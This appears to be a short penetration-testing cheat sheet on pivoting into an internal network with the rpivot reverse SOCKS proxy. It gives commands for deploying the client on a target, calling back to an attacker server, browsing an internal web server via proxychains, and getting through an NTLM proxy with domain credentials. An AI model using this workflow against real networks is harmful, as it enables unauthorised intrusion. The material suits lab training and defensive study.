**Overview:**
[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.

, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have [HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password

---

```
git clone https://github.com/klsecservices/rpivot.git
```
install the tool

```
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
start the server

```
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
transfer rpivot to the target system

```
 python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```
run client.py from the target system.

```
proxychains firefox-esr 172.16.5.135:80
```
browse on the target web server using proxychains

```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
Connecting to a Web Server using HTTP-Proxy & NTLM Auth